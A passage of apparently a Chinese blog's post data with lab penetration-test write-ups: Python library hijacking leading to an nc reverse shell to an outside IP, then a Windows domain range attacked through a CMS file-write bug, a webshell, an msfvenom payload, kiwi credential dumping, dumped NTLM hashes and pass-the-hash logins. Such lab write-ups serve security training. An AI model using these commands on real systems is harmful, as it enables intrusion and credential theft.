class=\"line\">\t^\t1\t4</span><br><span class=\"line\">\t.\t1\t3</span><br><span class=\"line\">\t+\t1\t3</span><br></pre></td></tr></table></figure>\n\n<p>然后读取/usr/local/etc/mypass.txt文件</p>\n<p>david的密码为<code>h4ck3rd4v!d </code></p>\n<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><p>上传一个pspy64查看，发现每隔一段时间会运行一次suid.py文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">2025/04/18 04:01:01 CMD: UID=0     PID=670    | /bin/sh -c /usr/bin/python3.9 /opt/suid.py</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#suid.py</span><br><span class=\"line\">from os import system</span><br><span class=\"line\">from pathlib import Path</span><br><span class=\"line\"></span><br><span class=\"line\"># Reading only first line</span><br><span class=\"line\">try:</span><br><span class=\"line\">    with open(&#x27;/home/david/cmd.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class=\"line\">        read_only_first_line = f.readline()</span><br><span class=\"line\">    # Write a new file</span><br><span class=\"line\">    with open(&#x27;/tmp/suid.txt&#x27;, &#x27;w&#x27;) as f:</span><br><span class=\"line\">        f.write(f&quot;&#123;read_only_first_line&#125;&quot;)</span><br><span class=\"line\">    check = Path(&#x27;/tmp/suid.txt&#x27;)</span><br><span class=\"line\">    if check:</span><br><span class=\"line\">        print(&quot;File exists&quot;)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            os.system(&quot;chmod u+s /bin/bash&quot;)</span><br><span class=\"line\">        except NameError:</span><br><span class=\"line\">            print(&quot;Done&quot;)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&quot;File not exists&quot;)</span><br><span class=\"line\">except FileNotFoundError:</span><br><span class=\"line\">    print(&quot;File not exists&quot;)</span><br></pre></td></tr></table></figure>\n\n<p>这个脚本永远不会执行chmod，查看是否可以劫持</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 -c &#x27;import sys; print(sys.path)&#x27;</span><br><span class=\"line\">[&#x27;&#x27;, &#x27;/usr/lib/python39.zip&#x27;, &#x27;/usr/lib/python3.9&#x27;, &#x27;/usr/lib/python3.9/lib-dynload&#x27;, &#x27;/usr/local/lib/python3.9/dist-packages&#x27;, &#x27;/usr/lib/python3/dist-packages&#x27;]</span><br><span class=\"line\">david@system:/usr/lib/python3.9$ find ./ -writable 2&gt;/dev/null</span><br><span class=\"line\">./os.py</span><br></pre></td></tr></table></figure>\n\n<p>向os.py尾部添加</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import subprocess</span><br><span class=\"line\">def shell():</span><br><span class=\"line\">    import subprocess</span><br><span class=\"line\">    subprocess.call(&quot;nc&quot; + &quot;192.168.31.129 9999 -e /bin/bash&quot;, shell=True)</span><br><span class=\"line\">shell()</span><br></pre></td></tr></table></figure>\n\n<p>然后监听一个端口静静等shell弹回来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">id</span><br><span class=\"line\">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>\n\n","categories":["HackMyVM"],"tags":["靶机"]},{"title":"春秋云镜-Delegation","url":"/2025/04/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/","content":"<h1 id=\"FLAG1\"><a href=\"#FLAG1\" class=\"headerlink\" title=\"FLAG1\"></a>FLAG1</h1><p>首先对靶机进行信息搜集</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# ../pentest/fscan/fscan2 -h 39.99.130.13</span><br><span class=\"line\">┌──────────────────────────────────────────────┐</span><br><span class=\"line\">│    ___                              _        │</span><br><span class=\"line\">│   / _ \\     ___  ___ _ __ __ _  ___| | __    │</span><br><span class=\"line\">│  / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class=\"line\">│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   &lt;     │</span><br><span class=\"line\">│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │</span><br><span class=\"line\">└──────────────────────────────────────────────┘</span><br><span class=\"line\">      Fscan Version: 2.0.0</span><br><span class=\"line\"></span><br><span class=\"line\">[2025-04-17 22:29:55] [INFO] 暴力破解线程数: 1</span><br><span class=\"line\">[2025-04-17 22:29:55] [INFO] 开始信息扫描</span><br><span class=\"line\">[2025-04-17 22:29:55] [INFO] 最终有效主机数量: 1</span><br><span class=\"line\">[2025-04-17 22:29:55] [INFO] 开始主机扫描</span><br><span class=\"line\">[2025-04-17 22:29:55] [INFO] 有效端口数量: 233</span><br><span class=\"line\">[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:22</span><br><span class=\"line\">[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:21</span><br><span class=\"line\">[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:3306</span><br><span class=\"line\">[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:80</span><br><span class=\"line\">[2025-04-17 22:29:56] [SUCCESS] 服务识别 39.99.130.13:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux  信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class=\"line\">[2025-04-17 22:29:56] [SUCCESS] 服务识别 39.99.130.13:21 =&gt; [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]</span><br><span class=\"line\">[2025-04-17 22:30:01] [SUCCESS] 服务识别 39.99.130.13:3306 =&gt; [mysql] 版本:8.0.29-0ubuntu0.20.04.3 产品:MySQL</span><br><span class=\"line\">[2025-04-17 22:30:01] [SUCCESS] 服务识别 39.99.130.13:80 =&gt; [http]</span><br><span class=\"line\">[2025-04-17 22:30:04] [INFO] 存活端口数量: 4</span><br><span class=\"line\">[2025-04-17 22:30:04] [INFO] 开始漏洞扫描</span><br><span class=\"line\">[2025-04-17 22:30:04] [INFO] 加载的插件: ftp, mysql, ssh, webpoc, webtitle</span><br><span class=\"line\">[2025-04-17 22:30:05] [SUCCESS] 网站标题 http://39.99.130.13       状态码:200 长度:68104  标题:中文网页标题</span><br></pre></td></tr></table></figure>\n\n<p>80端口是cmseasy,url后面拼接/admin版本号是v7752,在网上可以查到漏洞</p>\n<p><a href=\"https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/\">https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</a></p>\n<p>都需要登录后台，弱口令admin:123456登录成功了</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation1.png\"></p>\n<p>发包然后去访问1.php可以发现写入成功了，写个一句话木马，然后蚁剑连接</p>\n<p>flag在/home/flag/下，但是只有root能查看，反弹一个shell准备提权</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">www-data@localhost:/var/www/html$ find / -perm -u=s 2&gt;/dev/null</span><br><span class=\"line\">find / -perm -u=s 2&gt;/dev/null</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/bin/stapbpf</span><br><span class=\"line\">/usr/bin/gpasswd</span><br><span class=\"line\">/usr/bin/chfn</span><br><span class=\"line\">/usr/bin/su</span><br><span class=\"line\">/usr/bin/chsh</span><br><span class=\"line\">/usr/bin/staprun</span><br><span class=\"line\">/usr/bin/at</span><br><span class=\"line\">/usr/bin/diff</span><br><span class=\"line\">/usr/bin/fusermount</span><br><span class=\"line\">/usr/bin/sudo</span><br><span class=\"line\">/usr/bin/mount</span><br><span class=\"line\">/usr/bin/newgrp</span><br><span class=\"line\">/usr/bin/umount</span><br><span class=\"line\">/usr/bin/passwd</span><br><span class=\"line\">/usr/lib/openssh/ssh-keysign</span><br><span class=\"line\">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class=\"line\">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure>\n\n<p>可以看到diff具有suid权限，可以读取flag01.txt</p>\n<h1 id=\"FLAG2\"><a href=\"#FLAG2\" class=\"headerlink\" title=\"FLAG2\"></a>FLAG2</h1><p>还给了一个hint</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Great job!!!!!!</span><br><span class=\"line\">Here is the hint: WIN19\\Adrian</span><br><span class=\"line\">I&#x27;ll do whatever I can to rock you...</span><br></pre></td></tr></table></figure>\n\n<p>上传一个fscan先扫，然后做一个代理隧道</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">www-data@localhost:/tmp$ ./fscan -h 172.22.4.36/24</span><br><span class=\"line\">./fscan -h 172.22.4.36/24</span><br><span class=\"line\">┌──────────────────────────────────────────────┐</span><br><span class=\"line\">│    ___                              _        │</span><br><span class=\"line\">│   / _ \\     ___  ___ _ __ __ _  ___| | __    │</span><br><span class=\"line\">│  / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class=\"line\">│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   &lt;     │</span><br><span class=\"line\">│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │</span><br><span class=\"line\">└──────────────────────────────────────────────┘</span><br><span class=\"line\">      Fscan Version: 2.0.0</span><br><span class=\"line\"></span><br><span class=\"line\">[2025-04-18 11:04:32] [INFO] 暴力破解线程数: 1</span><br><span class=\"line\">[2025-04-18 11:04:32] [INFO] 开始信息扫描</span><br><span class=\"line\">[2025-04-18 11:04:32] [INFO] CIDR范围: 172.22.4.0-172.22.4.255</span><br><span class=\"line\">[2025-04-18 11:04:32] [INFO] 生成IP范围: 172.22.4.0.%!d(string=172.22.4.255) - %!s(MISSING).%!d(MISSING)</span><br><span class=\"line\">[2025-04-18 11:04:32] [INFO] 解析CIDR 172.22.4.36/24 -&gt; IP范围 172.22.4.0-172.22.4.255</span><br><span class=\"line\">[2025-04-18 11:04:33] [INFO] 最终有效主机数量: 256</span><br><span class=\"line\">[2025-04-18 11:04:33] [INFO] 开始主机扫描</span><br><span class=\"line\">[2025-04-18 11:04:33] [INFO] 正在尝试无监听ICMP探测...</span><br><span class=\"line\">[2025-04-18 11:04:33] [INFO] 当前用户权限不足,无法发送ICMP包</span><br><span class=\"line\">[2025-04-18 11:04:33] [INFO] 切换为PING方式探测...</span><br><span class=\"line\">[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.7      存活 (ICMP)</span><br><span class=\"line\">[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.36     存活 (ICMP)</span><br><span class=\"line\">[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.45     存活 (ICMP)</span><br><span class=\"line\">[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.19     存活 (ICMP)</span><br><span class=\"line\">[2025-04-18 11:04:39] [INFO] 存活主机数量: 4</span><br><span class=\"line\">[2025-04-18 11:04:39] [INFO] 有效端口数量: 233</span><br><span class=\"line\">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:80</span><br><span class=\"line\">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:80</span><br><span class=\"line\">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:135</span><br><span class=\"line\">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:139</span><br><span class=\"line\">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.19:135</span><br><span class=\"line\">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:139</span><br><span class=\"line\">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:135</span><br><span class=\"line\">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.19:139</span><br><span class=\"line\">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:389</span><br><span class=\"line\">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:445</span><br><span class=\"line\">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:22</span><br><span class=\"line\">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:21</span><br><span class=\"line\">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.19:445</span><br><span class=\"line\">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:445</span><br><span class=\"line\">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:88</span><br><span class=\"line\">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:3306</span><br><span class=\"line\">[2025-04-18 11:04:39] [SUCCESS] 服务识别 172.22.4.36:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class=\"line\">[2025-04-18 11:04:40] [SUCCESS] 服务识别 172.22.4.36:21 =&gt; [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]</span><br><span class=\"line\">[2025-04-18 11:04:40] [SUCCESS] 服务识别 172.22.4.36:3306 =&gt; [mysql] 版本:8.0.29-0ubuntu0.20.04.3 产品:MySQL Banner:[[.8.0.29-0ubuntu0.20.04.3 @.uoo ^_Z.Q.8Db#X \\&gt;; caching_sha2_password]</span><br><span class=\"line\">[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.45:80 =&gt; [http]</span><br><span class=\"line\">[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.45:139 =&gt;  Banner:[.]</span><br><span class=\"line\">[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.7:139 =&gt;  Banner:[.]</span><br><span class=\"line\">[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.19:139 =&gt;  Banner:[.]</span><br><span class=\"line\">[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.7:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name</span><br><span class=\"line\">[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.7:445 =&gt; </span><br><span class=\"line\">[2025-04-18 11:04:45] [SUCCESS] 服务识别 172.22.4.19:445 =&gt; </span><br><span class=\"line\">[2025-04-18 11:04:45] [SUCCESS] 服务识别 172.22.4.45:445 =&gt; </span><br><span class=\"line\">[2025-04-18 11:04:45] [SUCCESS] 服务识别 172.22.4.7:88 =&gt; </span><br><span class=\"line\">[2025-04-18 11:04:48] [SUCCESS] 服务识别 172.22.4.36:80 =&gt; [http]</span><br><span class=\"line\">[2025-04-18 11:05:44] [SUCCESS] 服务识别 172.22.4.7:135 =&gt; </span><br><span class=\"line\">[2025-04-18 11:05:44] [SUCCESS] 服务识别 172.22.4.19:135 =&gt; </span><br><span class=\"line\">[2025-04-18 11:05:44] [SUCCESS] 服务识别 172.22.4.45:135 =&gt; </span><br><span class=\"line\">[2025-04-18 11:05:44] [INFO] 存活端口数量: 16</span><br><span class=\"line\">[2025-04-18 11:05:44] [INFO] 开始漏洞扫描</span><br><span class=\"line\">[2025-04-18 11:05:44] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class=\"line\">[2025-04-18 11:05:44] [SUCCESS] NetInfo 扫描结果</span><br><span class=\"line\">目标主机: 172.22.4.45</span><br><span class=\"line\">主机名: WIN19</span><br><span class=\"line\">发现的网络接口:</span><br><span class=\"line\">   IPv4地址:</span><br><span class=\"line\">      └─ 172.22.4.45</span><br><span class=\"line\">[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.45     XIAORANG\\WIN19                </span><br><span class=\"line\">[2025-04-18 11:05:45] [SUCCESS] 网站标题 http://172.22.4.45        状态码:200 长度:703    标题:IIS Windows Server</span><br><span class=\"line\">[2025-04-18 11:05:45] [SUCCESS] NetInfo 扫描结果</span><br><span class=\"line\">目标主机: 172.22.4.7</span><br><span class=\"line\">主机名: DC01</span><br><span class=\"line\">发现的网络接口:</span><br><span class=\"line\">   IPv4地址:</span><br><span class=\"line\">      └─ 172.22.4.7</span><br><span class=\"line\">[2025-04-18 11:05:45] [SUCCESS] NetInfo 扫描结果</span><br><span class=\"line\">目标主机: 172.22.4.19</span><br><span class=\"line\">主机名: FILESERVER</span><br><span class=\"line\">发现的网络接口:</span><br><span class=\"line\">   IPv4地址:</span><br><span class=\"line\">      └─ 172.22.4.19</span><br><span class=\"line\">[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.7      DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class=\"line\">[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393</span><br><span class=\"line\">[2025-04-18 11:05:45] [INFO] 系统信息 172.22.4.7 [Windows Server 2016 Datacenter 14393]</span><br><span class=\"line\">[2025-04-18 11:05:45] [SUCCESS] 网站标题 http://172.22.4.36        状态码:200 长度:68100  标题:中文网页标题</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>上面的flag1给了个提示在WIN19那台机器上存在一个Adrian用户，密码在rockyou里</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SMB         172.22.4.45     445    WIN19            [-] WIN19\\Adrian:babygirl1 STATUS_PASSWORD_EXPIRED</span><br></pre></td></tr></table></figure>\n\n<p>还是得眼尖一点，密码过期他不会告诉你，rdp登录修改密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">rdesktop 172.22.4.45</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation2.png\"></p>\n<p>桌面上有一个PrivescCheck文件夹，PrivescCheck是一个提权的工具，他跑完了留下一个html文件，直接访问就行</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation3.png\"></p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation4.png\"></p>\n<p>给了两个high，第一个WSUS 更多的是被利用来横向移动,第二个注册表，用户对gpupdate具有写、启动、停止的的权限</p>\n<p>用msf生成一个正向的木马</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=9999 -f exe -o bind.exe</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/x64/meterpreter/bind_tcp</span><br><span class=\"line\">set LPORT 9999</span><br><span class=\"line\">set RHOST 172.22.4.45</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n\n<p>将马上传上去然后修改一下注册表手动启动服务</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation5.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sc start gupdate</span><br></pre></td></tr></table></figure>\n\n<p>但是这个shell很快就会断开，所以要迁移到另一个进程中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ps</span><br><span class=\"line\">migrate PID</span><br></pre></td></tr></table></figure>\n\n<p>不知道为什么我的msf shell启动不起来，导出hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">load kiwi</span><br><span class=\"line\">creds_all</span><br><span class=\"line\">meterpreter &gt; creds_all</span><br><span class=\"line\">[+] Running as SYSTEM</span><br><span class=\"line\">[*] Retrieving all credentials</span><br><span class=\"line\">msv credentials</span><br><span class=\"line\">===============</span><br><span class=\"line\"></span><br><span class=\"line\">Username  Domain    NTLM                              SHA1</span><br><span class=\"line\">--------  ------    ----                              ----</span><br><span class=\"line\">Adrian    WIN19     4ba5d16eb261eb61148ab5264f457cbb  9a712bd84b09123d36da74d9d5ac255c027588eb</span><br><span class=\"line\">WIN19$    XIAORANG  d41fef724adf6f2ed2cbb5a4ebd186c9  af156e5c6afc93b1a648040bd59f7d5cab23d81a</span><br><span class=\"line\">WIN19$    XIAORANG  5943c35371c96f19bda7b8e67d041727  5a4dc280e89974fdec8cf1b2b76399d26f39b8f8</span><br><span class=\"line\"></span><br><span class=\"line\">wdigest credentials</span><br><span class=\"line\">===================</span><br><span class=\"line\"></span><br><span class=\"line\">Username  Domain    Password</span><br><span class=\"line\">--------  ------    --------</span><br><span class=\"line\">(null)    (null)    (null)</span><br><span class=\"line\">Adrian    WIN19     (null)</span><br><span class=\"line\">WIN19$    XIAORANG  (null)</span><br><span class=\"line\"></span><br><span class=\"line\">kerberos credentials</span><br><span class=\"line\">====================</span><br><span class=\"line\"></span><br><span class=\"line\">Username  Domain        Password</span><br><span class=\"line\">--------  ------        --------</span><br><span class=\"line\">(null)    (null)        (null)</span><br><span class=\"line\">Adrian    WIN19         (null)</span><br><span class=\"line\">WIN19$    xiaorang.lab  ab 04 9b b9 d9 60 00 27 6b a0 0c 12 eb 66 73 a5 28 ef 5c 0e c3 89 fa c2 4b f8 67 35 a9 25</span><br><span class=\"line\">                         75 bd c0 62 20 be d1 58 31 0b d1 5b 0e 15 41 4f c6 c6 4f 10 43 c8 cf a4 66 b8 0b 5c e8 4</span><br><span class=\"line\">                        5 dd 12 e9 f9 8b 47 4c e1 6d cb 52 e1 5f 97 c3 73 1b 79 89 ca 8d 4c bf 42 47 4b 69 91 16</span><br><span class=\"line\">                        9e 01 e2 78 36 07 fe 11 3b 1f f0 0a 12 6a d7 d8 b1 71 de 2e bd 75 84 c7 00 fa 3b 7c 7f 9a</span><br><span class=\"line\">                         75 85 e8 93 23 ae 41 64 34 7d da 85 3a 5e 61 72 a4 5d 39 57 4b 1e ab 81 a7 02 ef ac 6c 6</span><br><span class=\"line\">                        1 af 28 2a ee ab 34 ce 1e 00 d3 f7 89 d7 fd 40 29 ce 0c e2 c3 d1 fa d8 9f df d2 3d 7e 9d</span><br><span class=\"line\">                        d8 05 77 70 60 3c 7d a6 d3 83 a7 e2 bf b0 a2 c7 57 97 d0 d3 ab c0 ee cb e2 b7 3d e7 a6 5d</span><br><span class=\"line\">                         fd de 51 0c f2 69 d1 58 af ee 8d d1 c0 a3 14 ab 09 c8 9d db 37 e6 8e 62 b2 71 61 d6 2d 5</span><br><span class=\"line\">                        c 57 a8</span><br><span class=\"line\">WIN19$    xiaorang.lab  3a 94 de 4d 87 8e 7d 46 88 ec 9c 70 fd f0 c5 3e 4c f3 ce 6a 80 79 46 c6 2f f9 52 9b 4e 1d</span><br><span class=\"line\">                         90 58 52 2a 4e ac bf 05 09 08 06 0c 4b a9 a2 aa a2 9d db 0d f8 09 82 c0 6e f4 1b 81 93 5</span><br><span class=\"line\">                        9 67 54 de 17 82 d7 c3 82 c5 38 13 4f d0 55 98 f6 a2 cc e7 cb 85 84 35 8a 0c 2e 9f d1 90</span><br><span class=\"line\">                        0c 0f c1 ea 0d d9 c5 d9 7f 29 a3 57 46 6b bf a4 b9 73 9a 80 84 1d df 3f 33 f5 16 e4 ee 2e</span><br><span class=\"line\">                         d3 88 92 cd a5 6e ac e3 eb 71 43 ed 7c b8 a2 9e 52 d5 31 1c 50 9b c8 71 03 e1 8e 4f 60 5</span><br><span class=\"line\">                        3 84 13 19 02 e2 8d 92 3f dc 0b 38 2c 13 c1 0e 6b 64 a7 fc 7a 2a a5 0e e0 b0 66 a9 a0 2f</span><br><span class=\"line\">                        8d 8d 40 f8 72 d3 36 d3 3a a9 0d 3f b9 00 ef 3e 90 d9 36 a2 ad 36 2a 22 cd a0 cc 5b f4 0e</span><br><span class=\"line\">                         a4 6b d3 24 8e 6e 99 59 96 d9 f8 a7 26 09 58 0a c2 3a 69 56 76 40 b9 10 92 a7 5c aa 3d e</span><br><span class=\"line\">                        1 d0 1f</span><br><span class=\"line\">win19$    XIAORANG.LAB  ab 04 9b b9 d9 60 00 27 6b a0 0c 12 eb 66 73 a5 28 ef 5c 0e c3 89 fa c2 4b f8 67 35 a9 25</span><br><span class=\"line\">                         75 bd c0 62 20 be d1 58 31 0b d1 5b 0e 15 41 4f c6 c6 4f 10 43 c8 cf a4 66 b8 0b 5c e8 4</span><br><span class=\"line\">                        5 dd 12 e9 f9 8b 47 4c e1 6d cb 52 e1 5f 97 c3 73 1b 79 89 ca 8d 4c bf 42 47 4b 69 91 16</span><br><span class=\"line\">                        9e 01 e2 78 36 07 fe 11 3b 1f f0 0a 12 6a d7 d8 b1 71 de 2e bd 75 84 c7 00 fa 3b 7c 7f 9a</span><br><span class=\"line\">                         75 85 e8 93 23 ae 41 64 34 7d da 85 3a 5e 61 72 a4 5d 39 57 4b 1e ab 81 a7 02 ef ac 6c 6</span><br><span class=\"line\">                        1 af 28 2a ee ab 34 ce 1e 00 d3 f7 89 d7 fd 40 29 ce 0c e2 c3 d1 fa d8 9f df d2 3d 7e 9d</span><br><span class=\"line\">                        d8 05 77 70 60 3c 7d a6 d3 83 a7 e2 bf b0 a2 c7 57 97 d0 d3 ab c0 ee cb e2 b7 3d e7 a6 5d</span><br><span class=\"line\">                         fd de 51 0c f2 69 d1 58 af ee 8d d1 c0 a3 14 ab 09 c8 9d db 37 e6 8e 62 b2 71 61 d6 2d 5</span><br><span class=\"line\">                        c 57 a8</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>hashdump</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::</span><br><span class=\"line\">Adrian:1003:aad3b435b51404eeaad3b435b51404ee:4ba5d16eb261eb61148ab5264f457cbb:::</span><br><span class=\"line\">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e:::</span><br></pre></td></tr></table></figure>\n\n<p>用Administrator登录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# impacket-wmiexec  -hashes aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab Administrator@172.22.4.45</span><br><span class=\"line\">C:\\&gt;type C:\\Users\\Administrator\\flag\\flag02.txt</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"FLAG3-amp-FLAG4\"><a href=\"#FLAG3-amp-FLAG4\" class=\"headerlink\" title=\"FLAG3&amp;FLAG4\"></a>FLAG3&amp;FLAG4</h1><p>添加一个新用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">net user lv Asd123132 /add</span><br><span class=\"line\">net localgroup administrators lv /add</span><br></pre></td></tr></table></figure>\n\n<p>查看域内委派关系</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\lv\\Desktop&gt;Adinfo_win.exe -d=&quot;xiaorang.lab&quot; --dc=&quot;172.22.4.7&quot; -u=&quot;WIN19$&quot; -H=&quot;d41fef724adf6f2ed2cbb5a4ebd186c9&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">           _____  _        __</span><br><span class=\"line\">     /\\   |  __ \\(_)      / _|</span><br><span class=\"line\">    /  \\  | |  | |_ _ __ | |_ ___</span><br><span class=\"line\">   / /\\ \\ | |  | | | &#x27;_ \\|  _/ _ \\     Tools that collect information from domain</span><br><span class=\"line\">  / ____ \\| |__| | | | | | || (_) |</span><br><span class=\"line\"> /_/    \\_\\_____/|_|_| |_|_| \\___/     v1.5 by lzz</span><br><span class=\"line\"></span><br><span class=\"line\">[i] Try to connect &#x27;172.22.4.7&#x27;</span><br><span class=\"line\">[c] Auth Domain: xiaorang.lab</span><br><span class=\"line\">[c] Auth user: WIN19$</span><br><span class=\"line\">[c] Auth hash: d41fef724adf6f2ed2cbb5a4ebd186c9</span><br><span class=\"line\">[c] connected successfully,try to dump domain info</span><br><span class=\"line\">[i] DomainVersion found!</span><br><span class=\"line\">                    [+] Windows 2016 Server operating 